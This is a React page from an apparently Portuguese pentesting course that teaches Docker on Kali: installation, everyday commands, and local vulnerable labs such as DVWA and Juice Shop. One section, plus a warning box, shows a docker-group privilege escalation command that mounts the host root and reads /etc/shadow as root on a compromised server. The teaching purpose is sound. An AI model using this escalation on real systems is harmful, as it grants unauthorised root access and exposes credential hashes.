import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { CommandTable } from "@/components/ui/CommandTable";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function Docker() {
  return (
    <PageContainer
      title="Docker no Kali"
      subtitle="Containers para subir labs vulneráveis (DVWA, Juice Shop), isolar tools quebradas e empacotar payloads."
      difficulty="intermediario"
      timeToRead="18 min"
    >
      <h2>Por que Docker é arma de pentester</h2>
      <p>
        Container ≠ VM. <strong>Docker</strong> compartilha o kernel do host mas isola
        processos, rede e filesystem. Para você significa: subir um <code>DVWA</code>{" "}
        em 30 segundos, isolar um <code>BloodHound</code> sem poluir o Kali com 200
        dependências Python, e empacotar seu C2 num image que sobe igualzinho em
        qualquer VPS — incluindo um redirector descartável.
      </p>

      <h2>Instalar docker.io no Kali</h2>
      <p>
        O Kali traz o pacote <code>docker.io</code> direto no repositório oficial.
        Não confunda com o <code>docker-ce</code> da Docker Inc. (bom para Ubuntu,
        ruim aqui — versão diferente e às vezes quebra com o kernel rolling).
      </p>

      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo apt update && sudo apt install -y docker.io docker-compose-v2",
            out: `Reading package lists... Done
Building dependency tree... Done
The following NEW packages will be installed:
  containerd docker.io docker-compose-v2 runc tini
0 upgraded, 5 newly installed, 0 to remove and 0 not upgraded.
Need to get 87.4 MB of archives.`,
            outType: "info",
          },
          {
            comment: "habilita e sobe o daemon",
            cmd: "sudo systemctl enable --now docker",
            out: "Created symlink /etc/systemd/system/multi-user.target.wants/docker.service → /usr/lib/systemd/system/docker.service.",
            outType: "success",
          },
          {
            comment: "evita digitar sudo toda hora — adiciona ao grupo docker",
            cmd: "sudo usermod -aG docker $USER && newgrp docker",
            out: "(silencioso)",
            outType: "muted",
          },
          {
            cmd: "docker version --format '{{.Server.Version}}'",
            out: "26.1.5+dfsg1",
            outType: "success",
          },
          {
            cmd: "docker run --rm hello-world",
            out: `Unable to find image 'hello-world:latest' locally
latest: Pulling from library/hello-world
c1ec31eb5944: Pull complete
Digest: sha256:d000bc569937abbe195e20322a0bde6b2922d805332fd6d8a68b19f524b7d21d
Status: Downloaded newer image for hello-world:latest

Hello from Docker!
This message shows that your installation appears to be working correctly.`,
            outType: "success",
          },
        ]}
      />

      <AlertBox type="warning" title="Estar no grupo docker = root no host">
        <p>
          Quem entra no grupo <code>docker</code> consegue montar <code>/</code>{" "}
          dentro de um container e escrever em qualquer lugar como root. Em
          engagement isso é vetor de PrivEsc clássico:{" "}
          <code>id | grep docker</code> → <code>docker run -v /:/mnt -it alpine chroot /mnt sh</code>.
        </p>
      </AlertBox>

      <h2>Comandos do dia a dia</h2>
      <CommandTable
        title="docker — sobrevivência"
        variations={[
          { cmd: "docker ps", desc: "Lista containers RODANDO.", output: "CONTAINER ID   IMAGE   COMMAND   CREATED   STATUS   PORTS   NAMES" },
          { cmd: "docker ps -a", desc: "Inclui parados (zumbis ocupando espaço).", output: "Mostra containers com status Exited (0)." },
          { cmd: "docker images", desc: "Lista imagens baixadas.", output: "REPOSITORY TAG IMAGE ID CREATED SIZE" },
          { cmd: "docker pull kalilinux/kali-rolling", desc: "Baixa o Kali oficial reduzido (~150 MB).", output: "Status: Downloaded newer image for kalilinux/kali-rolling:latest" },
          { cmd: "docker run -it --rm <image> bash", desc: "Roda interativo, REMOVE container ao sair.", output: "Útil para testes rápidos e descartáveis." },
          { cmd: "docker run -d -p 8080:80 <image>", desc: "Daemon (-d) + map de porta host:container.", output: "Acesse http://localhost:8080." },
          { cmd: "docker exec -it <id> bash", desc: "Entra num container já rodando.", output: "Equivalente a 'ssh' para o container." },
          { cmd: "docker logs -f <id>", desc: "Tail dos logs (stdout/stderr do PID 1).", output: "Use -f como tail -f." },
          { cmd: "docker stop <id> && docker rm <id>", desc: "Para e remove container.", output: "rm -v também remove volumes anônimos." },
          { cmd: "docker rmi <image>", desc: "Apaga uma imagem local.", output: "Libera GB de disco rapidamente." },
          { cmd: "docker system prune -a", desc: "Limpeza geral: imagens, containers, redes, build cache não usados.", output: "Total reclaimed space: 12.4GB" },
          { cmd: "docker inspect <id> | jq '.[0].NetworkSettings.IPAddress'", desc: "IP interno do container.", output: '"172.17.0.3"' },
        ]}
      />

      <h2>Subindo um lab DVWA em 1 comando</h2>
      <Terminal
        path="~/labs"
        lines={[
          {
            cmd: "docker run -d --name dvwa -p 8080:80 vulnerables/web-dvwa",
            out: `Unable to find image 'vulnerables/web-dvwa:latest' locally
latest: Pulling from vulnerables/web-dvwa
9ff7e2e5f967: Pull complete
[...]
Status: Downloaded newer image for vulnerables/web-dvwa:latest
3c4f5e8a9b1c2d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9`,
            outType: "success",
          },
          {
            cmd: "docker ps",
            out: `CONTAINER ID   IMAGE                  COMMAND                CREATED         STATUS         PORTS                  NAMES
3c4f5e8a9b1c   vulnerables/web-dvwa   "/main.sh"             8 seconds ago   Up 7 seconds   0.0.0.0:8080->80/tcp   dvwa`,
            outType: "info",
          },
          {
            comment: "abra http://localhost:8080 e faça login admin/password",
            cmd: "curl -s -o /dev/null -w '%{http_code}\\n' http://localhost:8080/login.php",
            out: "200",
            outType: "success",
          },
        ]}
      />

      <Terminal
        path="~/labs"
        lines={[
          {
            comment: "OWASP Juice Shop — alvo SPA moderno",
            cmd: "docker run -d --name juice -p 3000:3000 bkimminich/juice-shop",
            out: "5d2e6f8a4c1b3e5d7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e",
            outType: "success",
          },
          {
            comment: "bWAPP — buggy web app",
            cmd: "docker run -d --name bwapp -p 8081:80 raesene/bwapp",
            out: "(roda em http://localhost:8081/install.php — aperte aqui no install antes de usar)",
            outType: "warning",
          },
          {
            comment: "VulnHub-style: Mutillidae II",
            cmd: "docker run -d --name mutillidae -p 8082:80 citizenstig/nowasp",
            out: "(http://localhost:8082)",
            outType: "info",
          },
        ]}
      />

      <h2>Volumes e bind mounts</h2>
      <p>
        Container é descartável; <strong>dados precisam morar fora</strong>. Duas
        opções: bind mount (caminho do host) ou volume nomeado (gerenciado pelo
        docker, fica em <code>/var/lib/docker/volumes/</code>).
      </p>

      <CommandTable
        title="-v / --mount"
        variations={[
          { cmd: "-v /home/wallyson/loot:/data", desc: "Bind mount: pasta do host visível no container.", output: "Útil para passar wordlists / receber output." },
          { cmd: "-v /home/wallyson/loot:/data:ro", desc: "Read-only — container não escreve.", output: "Defesa contra container malicioso editar seus arquivos." },
          { cmd: "-v meuvolume:/var/lib/mysql", desc: "Volume nomeado (gerenciado).", output: "Persiste após docker rm." },
          { cmd: "docker volume ls", desc: "Lista volumes.", output: "DRIVER VOLUME NAME" },
          { cmd: "docker volume inspect meuvolume", desc: "Mostra Mountpoint real no host.", output: '"Mountpoint": "/var/lib/docker/volumes/meuvolume/_data"' },
          { cmd: "--tmpfs /tmp", desc: "Sistema de arquivos só em RAM (ephemeral).", output: "Útil para tools que escrevem muito temporário." },
        ]}
      />

      <h2>Networks</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "docker network ls",
            out: `NETWORK ID     NAME      DRIVER    SCOPE
3a8b5c2d1e4f   bridge    bridge    local
4b9c6d3e2f5a   host      host      local
5c0d7e4f3a6b   none      null      local`,
            outType: "info",
          },
          {
            comment: "rede custom — containers se enxergam por nome",
            cmd: "docker network create lab_net",
            out: "9f8e7d6c5b4a3210fedcba9876543210fedcba9876543210fedcba9876543210",
            outType: "success",
          },
          {
            cmd: "docker run -d --name attacker --network lab_net kalilinux/kali-rolling sleep infinity",
            out: "1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b",
            outType: "success",
          },
          {
            cmd: "docker run -d --name target --network lab_net vulnerables/web-dvwa",
            out: "(target acessível por http://target/ DENTRO da rede lab_net)",
            outType: "muted",
          },
          {
            cmd: "docker exec -it attacker bash -c 'apt update && apt install -y curl && curl -s http://target/login.php | head -3'",
            out: `<html>
<head>
<title>Damn Vulnerable Web Application (DVWA) v1.0.7 :: Login</title>`,
            outType: "warning",
          },
        ]}
      />

      <h2>Dockerfile básico para uma tool sua</h2>
      <CodeBlock
        language="dockerfile"
        title="Dockerfile (recon-scanner)"
        code={`FROM kalilinux/kali-rolling

LABEL maintainer="wallyson"

RUN apt update && apt install -y --no-install-recommends \\
      nmap \\
      python3 \\
      python3-pip \\
      python3-requests \\
      git \\
    && rm -rf /var/lib/apt/lists/*

WORKDIR /opt/scanner
COPY scanner.py .

ENTRYPOINT ["python3", "scanner.py"]
CMD ["--help"]`}
      />

      <Terminal
        path="~/scanner"
        lines={[
          {
            cmd: "docker build -t wallyson/scanner:latest .",
            out: `[+] Building 42.7s (8/8) FINISHED
 => [internal] load build definition from Dockerfile
 => [1/4] FROM docker.io/kalilinux/kali-rolling
 => [2/4] RUN apt update && apt install -y nmap python3 ...
 => [3/4] WORKDIR /opt/scanner
 => [4/4] COPY scanner.py .
 => exporting to image
 => => writing image sha256:7a8b9c0d1e2f...
 => => naming to docker.io/wallyson/scanner:latest`,
            outType: "info",
          },
          {
            cmd: "docker run --rm wallyson/scanner:latest 192.168.56.0/24",
            out: `[+] Scan iniciado em 192.168.56.0/24
[+] 192.168.56.10  - tcp/22 ssh
[+] 192.168.56.10  - tcp/80 http
[+] 192.168.56.20  - tcp/445 microsoft-ds
Scan concluído em 12.4s`,
            outType: "success",
          },
        ]}
      />

      <h2>Image Kali oficial</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "kali-rolling vem ENXUTA (sem metasploit, nmap, etc.)",
            cmd: "docker run --rm -it kalilinux/kali-rolling bash",
            out: `┌──(root㉿3a4b5c)-[/]
└─# apt list --installed 2>/dev/null | wc -l
158`,
            outType: "info",
          },
          {
            comment: "use a meta-image kali-linux-headless para ter as tools",
            cmd: "apt update && apt install -y kali-linux-headless",
            out: "(baixa ~5 GB de tools — aí sim vira 'Kali')",
            outType: "warning",
          },
        ]}
      />

      <h2>Container como vetor de PrivEsc</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "shell num server — checar grupo do user comprometido",
            cmd: "id",
            out: "uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)",
            outType: "warning",
          },
          {
            comment: "monta / do host dentro do container e vira root",
            cmd: "docker run -v /:/host -it --rm alpine chroot /host sh",
            out: `# whoami
root
# cat /etc/shadow | head -1
root:$y$j9T$abcdef...:19874:0:99999:7:::`,
            outType: "error",
          },
        ]}
      />

      <PracticeBox
        title="Suba DVWA, descubra IP do container e ataque pela rede docker"
        goal="Subir DVWA, criar attacker container Kali na mesma rede, rodar nmap e curl no target SEM expor porta no host."
        steps={[
          "Crie a rede lab_net.",
          "Suba o DVWA conectado a lab_net (sem -p).",
          "Suba kali attacker na mesma rede.",
          "Do attacker, rode nmap no DNS interno 'dvwa' e curl no /login.php.",
        ]}
        command={`docker network create lab_net
docker run -d --name dvwa --network lab_net vulnerables/web-dvwa
docker run -it --rm --name atk --network lab_net kalilinux/kali-rolling bash -c \\
  "apt update && apt install -y nmap curl && nmap -p- dvwa && curl -s http://dvwa/login.php | head -5"`}
        expected={`Nmap scan report for dvwa (172.18.0.2)
Host is up (0.000023s latency).
Not shown: 65534 closed tcp ports
PORT   STATE SERVICE
80/tcp open  http

<html>
<head>
<title>Damn Vulnerable Web Application (DVWA) v1.0.7 :: Login</title>`}
        verify="Atacker enxergou o target pelo nome 'dvwa' (DNS embutido) sem expor porta no host."
      />

      <AlertBox type="info" title="Reaproveite o lab — não rode tudo no host">
        <p>
          Cada novo engagement merece um container limpo de tools. Snapshot,
          export (<code>docker save -o backup.tar img:tag</code>), restaura
          (<code>docker load -i backup.tar</code>). Seu Kali host fica intocado
          e você muda o ambiente em segundos.
        </p>
      </AlertBox>
    </PageContainer>
  );
}
